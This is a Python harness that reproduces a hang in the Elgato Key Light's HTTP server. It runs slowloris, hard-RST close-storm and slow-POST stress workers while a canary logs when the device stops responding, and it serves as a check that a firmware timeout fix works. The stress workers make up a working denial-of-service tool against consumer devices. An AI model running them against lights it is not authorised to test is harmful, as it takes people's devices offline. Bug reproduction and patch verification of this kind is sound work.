#!/usr/bin/env python3
"""
Elgato Key Light (Gen 1) HTTP server hang/crash reproduction harness.

Background: the light's HTTP server (Realtek RTL8195A/Ameba firmware) runs a strict
single-threaded accept loop (SimpleHTTPD_Socket_Accept, confirmed by disassembly -- see
the README). It sets TCP keepalive on each accepted client but never a receive timeout,
so a client that trickles data without finishing holds the server's one processing slot
indefinitely, blocking every other client until it times out or the device is power-cycled.

This script runs three stress patterns against that defect:

  - slowloris: trickles a request one header/pad line at a time, forever. This is the
    direct reproduction of the confirmed bug -- it holds the connection slot exactly the
    way a flaky client in the field would.
  - close-storm: rapid connect, partial request, hard RST close, repeated continuously.
    A supplementary pattern that adds connection churn/backlog pressure alongside the
    slowloris case.
  - window-starve: a POST body sent in a long run of small chunks with short delays, to
    see whether partial-upload handling has its own stall path independent of the
    accept-loop issue above.

This script runs a low-rate "canary" (clean GET /elgato/lights on a fresh connection
every ~2s) continuously, while cycling through the three phases. Canary failures are
logged with a timestamp and the active phase, so a hang can be correlated back to
whichever phase triggered it. Because the light's known symptom is "goes unresponsive,
needs a power cycle" rather than an audible reboot, the canary does NOT stop on failure;
it keeps trying, so you can see whether the device self-recovers once a phase ends or
stays dead until you power-cycle it (useful data either way).

Must be run from a machine on the same LAN as the light; this cannot be run from a
sandboxed/restricted environment with no route to the device.

Usage:
    python3 repro_httpd_hang.py --host 192.168.1.50 [options]

Options:
    --host HOST           Light's IP or hostname (required)
    --port PORT           HTTP API port (default: 9123)
    --mode MODE           slowloris | close-storm | window-starve | all (default: all)
    --duration SECONDS    Total run time (default: 300)
    --concurrency N       Concurrent stress connections per phase (default: 40)
    --phase-seconds SEC   Seconds spent per phase in "all" mode (default: 60)
    --canary-interval SEC Seconds between canary checks (default: 2)
    --canary-timeout SEC  Canary request timeout (default: 3)
    --log FILE            Log file path (default: repro_log_<timestamp>.jsonl)

Reading the results:
    Tail the log file while it runs. Look for a run of canary "fail" entries
    immediately following a phase transition; that phase is your trigger. On stock
    firmware, canary entries typically resume "ok" on their own once the stressing
    phase ends (the stall clears when the stalled connection finally drops) -- a
    real-world hang can simply last much longer, or never clear without a power
    cycle. Run the same test against patched firmware to confirm SO_RCVTIMEO fixes
    it: canary failures should stay brief and self-recovering even under concurrent
    stalls, instead of blocking every request for the duration of the phase.
"""

import argparse
import json
import socket
import sys
import threading
import time
import itertools
from datetime import datetime, timezone


def now_iso():
    return datetime.now(timezone.utc).isoformat(timespec="milliseconds")


class Logger:
    def __init__(self, path):
        self.path = path
        self._lock = threading.Lock()
        self._f = open(path, "a", buffering=1)

    def write(self, **fields):
        rec = {"ts": now_iso(), **fields}
        line = json.dumps(rec)
        with self._lock:
            self._f.write(line + "\n")
        print(line, flush=True)


class PhaseState:
    """Shared mutable state so the canary thread knows what stress phase is active."""

    def __init__(self):
        self._lock = threading.Lock()
        self.phase = "startup"

    def set(self, phase):
        with self._lock:
            self.phase = phase

    def get(self):
        with self._lock:
            return self.phase


def canary_loop(host, port, interval, timeout, log, phase_state, stop_event):
    consecutive_failures = 0
    while not stop_event.is_set():
        t0 = time.monotonic()
        ok = False
        err = None
        try:
            with socket.create_connection((host, port), timeout=timeout) as s:
                s.settimeout(timeout)
                req = (
                    "GET /elgato/lights HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    "Connection: close\r\n\r\n"
                ).encode()
                s.sendall(req)
                data = b""
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                ok = b"HTTP/1." in data and len(data) > 0
        except Exception as e:
            err = f"{type(e).__name__}: {e}"

        latency_ms = round((time.monotonic() - t0) * 1000, 1)
        phase = phase_state.get()

        if ok:
            if consecutive_failures > 0:
                log.write(
                    event="canary_recovered",
                    after_failures=consecutive_failures,
                    latency_ms=latency_ms,
                    phase=phase,
                )
            consecutive_failures = 0
            log.write(event="canary_ok", latency_ms=latency_ms, phase=phase)
        else:
            consecutive_failures += 1
            log.write(
                event="canary_fail",
                error=err,
                consecutive_failures=consecutive_failures,
                latency_ms=latency_ms,
                phase=phase,
            )

        stop_event.wait(interval)


def slowloris_worker(host, port, worker_id, stop_event, log):
    """Direct reproduction of the confirmed accept-loop defect: trickle data forever
    so the request never completes, holding the server's single processing slot."""
    try:
        s = socket.create_connection((host, port), timeout=5)
        s.settimeout(5)
        headers = [
            f"GET /elgato/lights?stress={worker_id} HTTP/1.1\r\n",
            f"Host: {host}\r\n",
            "X-Stress-Header: keepalive-fill\r\n",
        ]
        for h in headers:
            if stop_event.is_set():
                break
            s.sendall(h.encode())
            time.sleep(0.3)
        while not stop_event.is_set():
            try:
                s.sendall(b"X-Pad: a\r\n")
            except Exception:
                break
            time.sleep(1.0)
    except Exception as e:
        log.write(event="slowloris_worker_error", worker=worker_id, error=str(e))
    finally:
        try:
            s.close()
        except Exception:
            pass


def close_storm_worker(host, port, stop_event, log, counter):
    """Supplementary stress pattern: rapid open -> partial request -> hard RST close,
    repeated continuously, to add connection churn/backlog pressure alongside slowloris."""
    while not stop_event.is_set():
        try:
            s = socket.create_connection((host, port), timeout=2)
            s.settimeout(2)
            s.sendall(b"GET /elgato/lights HTTP/1.1\r\n")
            s.sendall(f"Host: {host}\r\n".encode())
            # Send a partial body so the server has unread data queued, then
            # slam the connection shut with RST (SO_LINGER 0) instead of a
            # clean FIN.
            s.sendall(b"Content-Length: 100\r\n\r\n")
            s.sendall(b"partial-body-then-rst")
            s.setsockopt(
                socket.SOL_SOCKET, socket.SO_LINGER, __import__("struct").pack("ii", 1, 0)
            )
            s.close()
            with counter["lock"]:
                counter["count"] += 1
        except Exception as e:
            log.write(event="close_storm_worker_error", error=str(e))
        time.sleep(0.02)


def window_starve_worker(host, port, worker_id, stop_event, log):
    """Supplementary stress pattern: send a POST body in a long sequence of tiny
    chunks with small delays, to see whether partial-upload handling has its own
    stall path independent of the accept-loop defect slowloris targets directly."""
    try:
        body = b"x" * 20000
        s = socket.create_connection((host, port), timeout=5)
        s.settimeout(5)
        header = (
            f"POST /elgato/lights?stress={worker_id} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: {len(body)}\r\n\r\n"
        ).encode()
        s.sendall(header)
        for i in range(0, len(body), 3):
            if stop_event.is_set():
                break
            try:
                s.sendall(body[i : i + 3])
            except Exception:
                break
            time.sleep(0.01)
    except Exception as e:
        log.write(event="window_starve_worker_error", worker=worker_id, error=str(e))
    finally:
        try:
            s.close()
        except Exception:
            pass


def run_phase(mode, host, port, concurrency, duration, log, phase_state, stop_event):
    phase_state.set(mode)
    log.write(event="phase_start", mode=mode, concurrency=concurrency, duration_s=duration)
    workers = []
    inner_stop = threading.Event()

    if mode == "slowloris":
        for i in range(concurrency):
            t = threading.Thread(
                target=slowloris_worker, args=(host, port, i, inner_stop, log), daemon=True
            )
            workers.append(t)
            t.start()
    elif mode == "close-storm":
        counter = {"lock": threading.Lock(), "count": 0}
        for i in range(concurrency):
            t = threading.Thread(
                target=close_storm_worker, args=(host, port, inner_stop, log, counter), daemon=True
            )
            workers.append(t)
            t.start()
    elif mode == "window-starve":
        for i in range(concurrency):
            t = threading.Thread(
                target=window_starve_worker, args=(host, port, i, inner_stop, log), daemon=True
            )
            workers.append(t)
            t.start()
    else:
        raise ValueError(f"unknown mode: {mode}")

    end = time.monotonic() + duration
    while time.monotonic() < end and not stop_event.is_set():
        time.sleep(0.5)

    inner_stop.set()
    for t in workers:
        t.join(timeout=3)
    log.write(event="phase_end", mode=mode)


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host", required=True, help="Light's IP or hostname")
    ap.add_argument("--port", type=int, default=9123)
    ap.add_argument(
        "--mode",
        choices=["slowloris", "close-storm", "window-starve", "all"],
        default="all",
    )
    ap.add_argument("--duration", type=int, default=300, help="Total run time in seconds")
    ap.add_argument("--concurrency", type=int, default=40)
    ap.add_argument("--phase-seconds", type=int, default=60, help="Seconds per phase in 'all' mode")
    ap.add_argument("--canary-interval", type=float, default=2.0)
    ap.add_argument("--canary-timeout", type=float, default=3.0)
    ap.add_argument("--log", default=None)
    args = ap.parse_args()

    log_path = args.log or f"repro_log_{int(time.time())}.jsonl"
    log = Logger(log_path)
    phase_state = PhaseState()
    stop_event = threading.Event()

    log.write(
        event="run_start",
        host=args.host,
        port=args.port,
        mode=args.mode,
        duration_s=args.duration,
        concurrency=args.concurrency,
    )

    canary_thread = threading.Thread(
        target=canary_loop,
        args=(args.host, args.port, args.canary_interval, args.canary_timeout, log, phase_state, stop_event),
        daemon=True,
    )
    canary_thread.start()

    try:
        if args.mode == "all":
            phases = itertools.cycle(["slowloris", "close-storm", "window-starve"])
            end = time.monotonic() + args.duration
            while time.monotonic() < end:
                mode = next(phases)
                remaining = end - time.monotonic()
                phase_dur = min(args.phase_seconds, max(1, int(remaining)))
                run_phase(mode, args.host, args.port, args.concurrency, phase_dur, log, phase_state, stop_event)
        else:
            run_phase(args.mode, args.host, args.port, args.concurrency, args.duration, log, phase_state, stop_event)
    except KeyboardInterrupt:
        log.write(event="run_interrupted")
    finally:
        phase_state.set("idle")
        stop_event.set()
        canary_thread.join(timeout=5)
        log.write(event="run_end")

    print(f"\nLog written to: {log_path}", file=sys.stderr)


if __name__ == "__main__":
    main()